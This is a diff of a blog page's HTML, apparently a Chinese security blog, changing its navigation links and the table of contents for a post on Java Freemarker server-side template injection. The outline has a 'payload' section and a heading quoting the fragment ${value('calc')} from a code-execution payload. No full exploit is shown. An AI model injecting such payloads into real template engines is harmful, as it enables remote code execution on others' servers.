+      <img class="lazyload lazyload placeholder" src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8152.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8152.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" src="" alt="">
     </div>
-    <a href="/2024/10/13/spring-yi-wen-ru-men-zhuan-zai/" class="post-nav-link">
+    <a href="/2025/04/28/java-thymeleaf-ssti-spel/" class="post-nav-link">
       <div class="title">
         下一篇: <i class="fas fa-angle-right"></i>
-        <div class="title-text">spring一文入门</div>
+        <div class="title-text">Java Thymeleaf SSTI(本质为SpEL)</div>
       </div>
       <!-- <div class="content">
-        Spring转载自https://www.yuque.com/5tooc3a/jas/vwovvqh6w86ifrye#
+        Java ssti，我特么莱辣
+分析一下thymeleaf，velocity，freemarker等的模板注入！这节是T
       </div> -->
     </a>
   </div>
@@ -975,7 +1093,7 @@
   <div class='content'>
     <div class="toc-main">
       <div class="toc-content">
-        <!-- <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#spring"><span class="toc-text">spring</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SeEL%E7%AE%80%E4%BB%8B"><span class="toc-text">SeEL简介</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#xml%E6%96%87%E6%A1%A3%E6%B3%A8%E5%85%A5"><span class="toc-text">xml文档注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SpelExpressionParser-%E6%B3%A8%E5%85%A5"><span class="toc-text">SpelExpressionParser 注入</span></a></li></ol> -->
+        <!-- <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Java-Freemarker-SSTI"><span class="toc-text">Java Freemarker SSTI</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Freemarker%E7%9A%84%E4%BD%BF%E7%94%A8"><span class="toc-text">Freemarker的使用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#FTL%E8%AF%AD%E6%B3%95"><span class="toc-text">FTL语法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E5%BB%BA%E5%87%BD%E6%95%B0-new"><span class="toc-text">内建函数 new</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#api"><span class="toc-text">api</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Freemarker%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-text">Freemarker模板注入漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#payload"><span class="toc-text">payload</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90"><span class="toc-text">调试分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%88%86%E5%89%B2"><span class="toc-text">字符串分割</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A8%A1%E6%9D%BF%E8%A7%A3%E6%9E%90"><span class="toc-text">模板解析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A7%A3%E6%9E%90-lt-assign-gt"><span class="toc-text">解析&lt;#assign&gt;</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A7%A3%E6%9E%90-value-quot-calc-quot"><span class="toc-text">解析${value(&quot;calc&quot;)}</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%902"><span class="toc-text">调试分析2</span></a></li></ol></li></ol></li></ol> -->
         <div class="toc"></div>
       </div>
     </div>
